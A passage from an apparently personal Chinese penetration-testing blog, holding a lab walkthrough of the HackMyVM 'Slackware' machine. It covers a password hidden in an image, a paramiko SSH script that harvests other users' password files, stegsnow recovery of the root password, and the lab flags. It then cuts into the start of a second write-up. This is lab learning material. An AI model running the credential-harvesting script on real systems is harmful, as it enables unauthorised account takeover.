http://192.168.56.16:2/getslack/twitter.7z.0015<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:35 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.0016<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:35 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.0017<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:35 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.0018<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:35 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.0019<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:35 ERROR 404: Not Found.<br><br>--2024-11-12 01:29:35--  http://192.168.56.16:2/getslack/twitter.7z.0020<br>Connecting to 192.168.56.16:2... connected.<br>HTTP request sent, awaiting response... 404 Not Found<br>2024-11-12 01:29:35 ERROR 404: Not Found.<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/32d526c40c17a119.png"></p><p>已经全部下载下来了，接下来进行解压。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/baji/slackware]<br>└─# 7z x twitter.7z.001<br><br>7-Zip 24.07 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-06-19<br> 64-bit locale=en_US.UTF-8 Threads:2 OPEN_MAX:1024<br><br>Scanning the drive <span class="hljs-keyword">for</span> archives:<br>1 file, 20480 bytes (20 KiB)<br><br>Extracting archive: twitter.7z.001<br>--         <br>Path = twitter.7z.001<br>Type = Split<br>Physical Size = 20480<br>Volumes = 14<br>Total Physical Size = 268100<br>----<br>Path = twitter.7z<br>Size = 268100<br>--<br>Path = twitter.7z<br>Type = 7z<br>Physical Size = 268100<br>Headers Size = 130<br>Method = LZMA2:384k<br>Solid = -<br>Blocks = 1<br><br>Everything is Ok<br><br>Size:       267951<br>Compressed: 268100<br></code></pre></td></tr></table></figure><p>x 选项可自动提取分卷文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/slackware]<br>└─# exiftool twitter.png<br>ExifTool Version Number         : 12.76<br>File Name                       : twitter.png<br>Directory                       : .<br>File Size                       : 268 kB<br>File Modification Date/Time     : 2024:03:10 16:42:47-04:00<br>File Access Date/Time           : 2024:11:12 01:30:12-05:00<br>File Inode Change Date/Time     : 2024:11:12 01:30:12-05:00<br>File Permissions                : -rw-r--r--<br>File Type                       : PNG<br>File Type Extension             : png<br>MIME Type                       : image/png<br>Image Width                     : 400<br>Image Height                    : 400<br>Bit Depth                       : 8<br>Color Type                      : RGB<br>Compression                     : Deflate/Inflate<br>Filter                          : Adaptive<br>Interlace                       : Noninterlaced<br>Profile Name                    : icc<br>Profile CMM Type                : Little CMS<br>Profile Version                 : 4.4.0<br>Profile Class                   : Display Device Profile<br>Color Space Data                : RGB<br>Profile Connection Space        : XYZ<br>Profile Date Time               : 2022:12:19 06:28:40<br>Profile File Signature          : acsp<br>Primary Platform                : Apple Computer Inc.<br>CMM Flags                       : Not Embedded, Independent<br>Device Manufacturer             : <br>Device Model                    : <br>Device Attributes               : Reflective, Glossy, Positive, Color<br>Rendering Intent                : Perceptual<br>Connection Space Illuminant     : 0.9642 1 0.82491<br>Profile Creator                 : Little CMS<br>Profile ID                      : 0<br>Profile Description             : GIMP built-in sRGB<br>Profile Copyright               : Public Domain<br>Media White Point               : 0.9642 1 0.82491<br>Chromatic Adaptation            : 1.04788 0.02292 -0.05022 0.02959 0.99048 -0.01707 -0.00925 0.01508 0.75168<br>Red Matrix Column               : 0.43604 0.22249 0.01392<br>Blue Matrix Column              : 0.14305 0.06061 0.71393<br>Green Matrix Column             : 0.38512 0.7169 0.09706<br>Red Tone Reproduction Curve     : (Binary data 32 bytes, use -b option to extract)<br>Green Tone Reproduction Curve   : (Binary data 32 bytes, use -b option to extract)<br>Blue Tone Reproduction Curve    : (Binary data 32 bytes, use -b option to extract)<br>Chromaticity Channels           : 3<br>Chromaticity Colorant           : Unknown<br>Chromaticity Channel 1          : 0.64 0.33002<br>Chromaticity Channel 2          : 0.3 0.60001<br>Chromaticity Channel 3          : 0.15001 0.06<br>Device Mfg Desc                 : GIMP<br>Device Model Desc               : sRGB<br>White Point X                   : 0.3127<br>White Point Y                   : 0.329<br>Red X                           : 0.64<br>Red Y                           : 0.33<br>Green X                         : 0.3<br>Green Y                         : 0.6<br>Blue X                          : 0.15<br>Blue Y                          : 0.06<br>Warning                         : [minor] Trailer data after PNG IEND chunk<br>Image Size                      : 400x400<br>Megapixels                      : 0.160<br>                                        <br></code></pre></td></tr></table></figure><p>使用exiftool查看图片信息并无任何有用的信息。<br>查看下二进制内容</p><p><img src="https://img.dkdun.cn/v1/2024/12/a469f731242683db.png"></p><p>疑似为密码。这里其实就是无界面化终端的软肋了qwq。我们去kali里看看这个图片的样子。</p><p><img src="https://img.dkdun.cn/v1/2024/12/553c20a7bf391b37.png"></p><p>这里就是社工了。。直接谷歌识图</p><p><img src="https://img.dkdun.cn/v1/2024/12/7fcf7e431be42de6.png"></p><p>获取到一个推特名，尝试是否能够登录</p><p>Patrick Volkerding</p><p>发现全名无法登录，所以我尝试取用前面的发现可以登录。密码即为图片二进制内容中：trYth1sPasS1993</p><p><img src="https://img.dkdun.cn/v1/2024/12/af50e19847eb9ce6.png"></p><p><img src="https://img.dkdun.cn/v1/2024/12/358a943d29a75344.png"></p><p>这里其实就是一个究极无敌的套娃。因为同组用户可以获取对方的密码（密码在用户目录下mypass.txt），但是有的组中的某个用户又分别在其他组。所以需要获取同组的另外一个用户密码然后切换然后再获取，直到发现user_flag</p><p>我是手动的，大概切换了十几个到二十几个 我忘了。user_flag在rpj7中。这里我借用一下大佬的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Time    : 2024/9/11 12:49</span><br><span class="hljs-comment"># @Author  : hgbe02</span><br><span class="hljs-comment"># @File    : slakeware_brute.py</span><br> <br><span class="hljs-keyword">import</span> paramiko<br> <br>usernames = []<br>passwords = []<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ssh_login_with_password</span>(<span class="hljs-params">host, port, username, password</span>):<br>    <span class="hljs-comment"># 创建一个新的 SSH 客户端对象</span><br>    client = paramiko.SSHClient()<br>    <span class="hljs-comment"># 自动添加策略，用于保存服务器的主机名和密钥信息（自动保存）</span><br>    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br> <br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 连接 SSH 服务端，这里使用了密码方式进行认证</span><br>        client.connect(host, port=port, username=username, password=password)<br> <br>        <span class="hljs-comment"># 执行命令获取用户名</span><br>        stdin, stdout, stderr = client.exec_command(<br>            <span class="hljs-string">&quot;find ../ -name *pass* -type f 2&gt;/dev/null | awk -F &#x27;[/]&#x27; &#x27;&#123;print $2&#125;&#x27;&quot;</span><br>        )<br>        output = stdout.read().decode().splitlines()<br>        <span class="hljs-comment"># print(&quot;[+] Username\n&quot;, output)</span><br>        <span class="hljs-keyword">global</span> usernames<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> output:<br>            stripped_line = line.strip()<br>            <span class="hljs-keyword">if</span> stripped_line <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> usernames:<br>                usernames.append(stripped_line)<br> <br>        <span class="hljs-comment"># 执行命令获取密码</span><br>        stdin, stdout, stderr = client.exec_command(<br>            <span class="hljs-string">&quot;find ../ -name &#x27;*pass*&#x27; -type f 2&gt;/dev/null | xargs cat&quot;</span><br>        )<br>        output = stdout.read().decode().splitlines()<br>        <span class="hljs-comment"># print(&quot;[+] Password\n&quot;, output)</span><br>        <span class="hljs-keyword">global</span> passwords<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> output:<br>            stripped_line = line.strip()<br>            <span class="hljs-keyword">if</span> stripped_line <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> passwords:<br>                passwords.append(stripped_line)<br> <br>    <span class="hljs-keyword">except</span> paramiko.AuthenticationException:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Authentication failed, please verify your credentials.&quot;</span>)<br>    <span class="hljs-keyword">except</span> paramiko.SSHException <span class="hljs-keyword">as</span> sshException:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Unable to establish SSH connection: &quot;</span> + <span class="hljs-built_in">str</span>(sshException))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Exception in connecting to the server: &quot;</span> + <span class="hljs-built_in">str</span>(e))<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-comment"># 关闭连接</span><br>        client.close()<br> <br>ssh_login_with_password(<span class="hljs-string">&#x27;192.168.10.100&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;patrick&#x27;</span>, <span class="hljs-string">&#x27;trYth1sPasS1993&#x27;</span>)<br> <br>a = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> a &lt; <span class="hljs-built_in">len</span>(usernames):<br>    ssh_login_with_password(<span class="hljs-string">&#x27;192.168.10.100&#x27;</span>, <span class="hljs-number">1</span>, usernames[a], passwords[a])<br>    a += <span class="hljs-number">1</span><br> <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] username and password ! (✪ω✪)&#x27;</span>)<br><span class="hljs-built_in">print</span>(usernames)<br><span class="hljs-built_in">print</span>(passwords)<br> <br><span class="hljs-comment"># [&#x27;claor&#x27;, &#x27;kretinga&#x27;, &#x27;mrmidnight&#x27;, &#x27;alienum&#x27;, &#x27;powerful&#x27;, &#x27;annlynn&#x27;, &#x27;proxy&#x27;, &#x27;x4v1l0k&#x27;, &#x27;icex64&#x27;, &#x27;mindsflee&#x27;,</span><br><span class="hljs-comment"># &#x27;zacarx007&#x27;, &#x27;terminal&#x27;, &#x27;zenmpi&#x27;, &#x27;sml&#x27;, &#x27;emvee&#x27;, &#x27;nls&#x27;, &#x27;noname&#x27;, &#x27;nolose&#x27;, &#x27;sancelisso&#x27;, &#x27;ruycr4ft&#x27;,</span><br><span class="hljs-comment"># &#x27;tasiyanci&#x27;, &#x27;lanz&#x27;, &#x27;pylon&#x27;, &#x27;wwfymn&#x27;, &#x27;whitecr0wz&#x27;, &#x27;bit&#x27;, &#x27;infayerts&#x27;, &#x27;rijaba1&#x27;, &#x27;cromiphi&#x27;, &#x27;gatogamer&#x27;,</span><br><span class="hljs-comment"># &#x27;ch4rm&#x27;, &#x27;aceomn&#x27;, &#x27;kerszi&#x27;, &#x27;d3b0o&#x27;, &#x27;avijneyam&#x27;, &#x27;zayotic&#x27;, &#x27;kaian&#x27;, &#x27;c4rta&#x27;, &#x27;boyras200&#x27;, &#x27;waidroc&#x27;, &#x27;ziyos&#x27;,</span><br><span class="hljs-comment"># &#x27;b4el7d&#x27;, &#x27;rpj7&#x27;, &#x27;h1dr0&#x27;, &#x27;catch_me75&#x27;, &#x27;josemlwdf&#x27;, &#x27;skinny&#x27;]</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># [&#x27;JRksNe5rWgis&#x27;, &#x27;lpV8UG0GxKuw&#x27;, &#x27;B4ReHPEhmlPt&#x27;,</span><br><span class="hljs-comment"># &#x27;ex0XVRAAjCWX&#x27;, &#x27;pof2XIpVzYl3&#x27;, &#x27;S64IamSERUI3&#x27;, &#x27;GX2xnNNU2Hcc&#x27;, &#x27;TB7pVPwPUeIW&#x27;, &#x27;tX5o7AUg2PTd&#x27;, &#x27;VZFoxk0lqnnc&#x27;,</span><br><span class="hljs-comment"># &#x27;8LCa5IDAELR4&#x27;, &#x27;Qv0dtvZdfpvN&#x27;, &#x27;WiEbQP6K4Sg9&#x27;, &#x27;AQewY20VryO7&#x27;, &#x27;sj5mu74Nmowb&#x27;, &#x27;VfS9EIU5C9xw&#x27;, &#x27;0Vsok2PoVo7t&#x27;,</span><br><span class="hljs-comment"># &#x27;KcHXtRsiUPpw&#x27;, &#x27;oAGSK1zXcbT8&#x27;, &#x27;G5UJEpW78pOV&#x27;, &#x27;JO8dvF60MdXR&#x27;, &#x27;IBrVGveXM3jI&#x27;, &#x27;6Mqoo8Pud4Fx&#x27;, &#x27;VBebiyG62uIg&#x27;,</span><br><span class="hljs-comment"># &#x27;51BwJ9iYO4E7&#x27;, &#x27;fDZRz4SJOs8z&#x27;, &#x27;NYURcD5V8k4X&#x27;, &#x27;eaqz8vJ2pRmU&#x27;, &#x27;CQBpV2NQ3U6A&#x27;, &#x27;yjwGMry82S2Y&#x27;, &#x27;Hz35MslshyXj&#x27;,</span><br><span class="hljs-comment"># &#x27;sXdnu8wF1Yb8&#x27;, &#x27;rjDwcHDFYBML&#x27;, &#x27;oHjylQ7402Dd&#x27;, &#x27;vRdS8PLTnTlW&#x27;, &#x27;bgg9TT9otdD6&#x27;, &#x27;R23AJFVTQYaB&#x27;, &#x27;IAuaOSSTZHoh&#x27;,</span><br><span class="hljs-comment"># &#x27;oW19TzLywNIq&#x27;, &#x27;0aApTUf5E2Eq&#x27;, &#x27;8eS8I1JGxeeZ&#x27;, &#x27;llMttpVCiYPw&#x27;, &#x27;wP26CtkDby6J&#x27;, &#x27;tnvAny2zwYTV&#x27;, &#x27;Vkyo6rKvXsIw&#x27;,</span><br><span class="hljs-comment"># &#x27;jLzXNEEFdtLX&#x27;, &#x27;iJ7EnTBCtUS8&#x27;]</span><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_command</span>(<span class="hljs-params">host, port, username, password, command</span>):<br>    <span class="hljs-comment"># 创建 SSH 客户端</span><br>    client = paramiko.SSHClient()<br>    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br> <br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 连接到SSH服务器</span><br>        client.connect(host, port=port, username=username, password=password)<br> <br>        <span class="hljs-comment"># 执行命令</span><br>        stdin, stdout, stderr = client.exec_command(command)<br> <br>        <span class="hljs-comment"># 获取命令结果</span><br>        output = stdout.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).strip()<br>        error = stderr.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).strip()<br> <br>        <span class="hljs-keyword">if</span> output:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] USER:<span class="hljs-subst">&#123;username&#125;</span> PASS:<span class="hljs-subst">&#123;password&#125;</span> =&gt; <span class="hljs-subst">&#123;output&#125;</span>&quot;</span>)<br> <br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-comment"># 关闭连接</span><br>        client.close()<br> <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Search user flag (っ^_^)っ&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(usernames)):<br>    execute_command(<span class="hljs-string">&#x27;192.168.10.100&#x27;</span>, <span class="hljs-number">1</span>, usernames[i], passwords[i], <span class="hljs-string">&quot;grep -Pnir &#x27;hmv&#x27; ./&quot;</span>)<br> <br><span class="hljs-comment"># [+] username and password ! (✪ω✪)</span><br><span class="hljs-comment"># [&#x27;claor&#x27;, &#x27;kretinga&#x27;, &#x27;mrmidnight&#x27;, &#x27;alienum&#x27;, &#x27;powerful&#x27;, &#x27;annlynn&#x27;, &#x27;proxy&#x27;, &#x27;x4v1l0k&#x27;, &#x27;icex64&#x27;, &#x27;mindsflee&#x27;, &#x27;zacarx007&#x27;, &#x27;terminal&#x27;, &#x27;zenmpi&#x27;, &#x27;sml&#x27;, &#x27;emvee&#x27;, &#x27;nls&#x27;, &#x27;noname&#x27;, &#x27;nolose&#x27;, &#x27;sancelisso&#x27;, &#x27;ruycr4ft&#x27;, &#x27;tasiyanci&#x27;, &#x27;lanz&#x27;, &#x27;pylon&#x27;, &#x27;wwfymn&#x27;, &#x27;whitecr0wz&#x27;, &#x27;bit&#x27;, &#x27;infayerts&#x27;, &#x27;rijaba1&#x27;, &#x27;cromiphi&#x27;, &#x27;gatogamer&#x27;, &#x27;ch4rm&#x27;, &#x27;aceomn&#x27;, &#x27;kerszi&#x27;, &#x27;d3b0o&#x27;, &#x27;avijneyam&#x27;, &#x27;zayotic&#x27;, &#x27;kaian&#x27;, &#x27;c4rta&#x27;, &#x27;boyras200&#x27;, &#x27;waidroc&#x27;, &#x27;ziyos&#x27;, &#x27;b4el7d&#x27;, &#x27;rpj7&#x27;, &#x27;h1dr0&#x27;, &#x27;catch_me75&#x27;, &#x27;josemlwdf&#x27;, &#x27;skinny&#x27;]</span><br><span class="hljs-comment"># [&#x27;JRksNe5rWgis&#x27;, &#x27;lpV8UG0GxKuw&#x27;, &#x27;B4ReHPEhmlPt&#x27;, &#x27;ex0XVRAAjCWX&#x27;, &#x27;pof2XIpVzYl3&#x27;, &#x27;S64IamSERUI3&#x27;, &#x27;GX2xnNNU2Hcc&#x27;, &#x27;TB7pVPwPUeIW&#x27;, &#x27;tX5o7AUg2PTd&#x27;, &#x27;VZFoxk0lqnnc&#x27;, &#x27;8LCa5IDAELR4&#x27;, &#x27;Qv0dtvZdfpvN&#x27;, &#x27;WiEbQP6K4Sg9&#x27;, &#x27;AQewY20VryO7&#x27;, &#x27;sj5mu74Nmowb&#x27;, &#x27;VfS9EIU5C9xw&#x27;, &#x27;0Vsok2PoVo7t&#x27;, &#x27;KcHXtRsiUPpw&#x27;, &#x27;oAGSK1zXcbT8&#x27;, &#x27;G5UJEpW78pOV&#x27;, &#x27;JO8dvF60MdXR&#x27;, &#x27;IBrVGveXM3jI&#x27;, &#x27;6Mqoo8Pud4Fx&#x27;, &#x27;VBebiyG62uIg&#x27;, &#x27;51BwJ9iYO4E7&#x27;, &#x27;fDZRz4SJOs8z&#x27;, &#x27;NYURcD5V8k4X&#x27;, &#x27;eaqz8vJ2pRmU&#x27;, &#x27;CQBpV2NQ3U6A&#x27;, &#x27;yjwGMry82S2Y&#x27;, &#x27;Hz35MslshyXj&#x27;, &#x27;sXdnu8wF1Yb8&#x27;, &#x27;rjDwcHDFYBML&#x27;, &#x27;oHjylQ7402Dd&#x27;, &#x27;vRdS8PLTnTlW&#x27;, &#x27;bgg9TT9otdD6&#x27;, &#x27;R23AJFVTQYaB&#x27;, &#x27;IAuaOSSTZHoh&#x27;, &#x27;oW19TzLywNIq&#x27;, &#x27;0aApTUf5E2Eq&#x27;, &#x27;8eS8I1JGxeeZ&#x27;, &#x27;llMttpVCiYPw&#x27;, &#x27;wP26CtkDby6J&#x27;, &#x27;tnvAny2zwYTV&#x27;, &#x27;Vkyo6rKvXsIw&#x27;, &#x27;jLzXNEEFdtLX&#x27;, &#x27;iJ7EnTBCtUS8&#x27;]</span><br><span class="hljs-comment"># [+] Search user flag (っ^_^)っ</span><br><span class="hljs-comment"># [+] USER:rpj7 PASS:wP26CtkDby6J =&gt; ./user.txt:1:HMV&#123;Th1s1s1Us3rFlag&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/2e02f8fe2a183385.png"></p><p>获取到flag位置，现在登录rpj7 </p><p><img src="https://img.dkdun.cn/v1/2024/12/bd08bc76f324fc5a.png"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>在http服务中我们已经获取到了user_flag，现在开始进行提权</p><h2 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h2><p><img src="https://img.dkdun.cn/v1/2024/12/a827d18ed080efd7.png"></p><p>sudo -l 发现需要登录密码。看来不行</p><h2 id="find-perm-u-s-type-f-2-dev-null"><a href="#find-perm-u-s-type-f-2-dev-null" class="headerlink" title="find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null"></a>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</h2><p>这个也不能提权</p><h2 id="txt隐写"><a href="#txt隐写" class="headerlink" title="txt隐写"></a>txt隐写</h2><p>通过大佬的提示，发现user.txt存在隐写（这个是真不知道0.0，以后长记性了）</p><p>首先把user.txt下载到kali中 （因为靶机没工具）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/slackware]<br>└─# scp -P 1 rpj7@192.168.56.16:~/user.txt user.txt<br>(rpj7@192.168.56.16) Password: <br>user.txt  <br></code></pre></td></tr></table></figure><p>使用stegsnow 查看文件隐写<br><img src="https://img.dkdun.cn/v1/2024/12/d83b906fea4f4ac0.png"></p><p>获取一个字符串，尝试登录root<br><img src="https://img.dkdun.cn/v1/2024/12/c7be2965cd6ade42.png"></p><p>成功登录，查看root.txt</p><p><img src="https://img.dkdun.cn/v1/2024/12/7c70c806840109c5.png"></p><p>说是不在这，在home目录？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@slackware:/home# grep -ri <span class="hljs-string">&#x27;root&#x27;</span><br>rpj7/.bash_history:su root<br>0xh3rshel/.screenrc:# Here is a flag <span class="hljs-keyword">for</span> root: HMV&#123;SlackwareStillAlive&#125;<br></code></pre></td></tr></table></figure><p>找到了</p><p>使用grep 查找home目录及其子目录下包含root的文件</p><p>-r 为递归查找<br>-i 忽略大小写</p><p>当然我们也可以直接查flag头</p><p>grep -ri ‘HMV’</p><p><img src="https://img.dkdun.cn/v1/2024/12/f82ed0324523a202.png"></p>]]></content>
    
    
    <categories>
      
      <category>cx的渗透日记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>digitalworld.loacl-DEVELOPMENT</title>
    <link href="/2024/11/12/digitalworld/"/>
    <url>/2024/11/12/digitalworld/</url>
    
    <content type="html"><![CDATA[<p>cx 师傅也太努力了吧(｡･ω･｡),fighting！</p><span id="more"></span><h1 id="探寻存活主机"><a href="#探寻存活主机" class="headerlink" title="探寻存活主机"></a>探寻存活主机</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali]<br>└─# arp-scan -l    <br>Interface: eth0, type: EN10MB, MAC: 00:0c:29:4d:25:0e, IPv4: 192.168.88.128<br>WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied<br>WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied<br>Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.88.1    00:50:56:c0:00:08       (Unknown)<br>192.168.88.2    00:50:56:e8:d9:46       (Unknown)<br>192.168.88.129  00:0c:29:25:4c:50       (Unknown)<br>192.168.88.254  00:50:56:e0:95:46       (Unknown)<br><br>5 packets received by filter, 0 packets dropped by kernel<br>Ending arp-scan 1.10.0: 256 hosts scanned in 2.067 seconds (123.85 hosts/sec). 4 responded<br></code></pre></td></tr></table></figure><p>192.168.88.129 </p><h1 id="探寻目标主机服务"><a href="#探寻目标主机服务" class="headerlink" title="探寻目标主机服务"></a>探寻目标主机服务</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 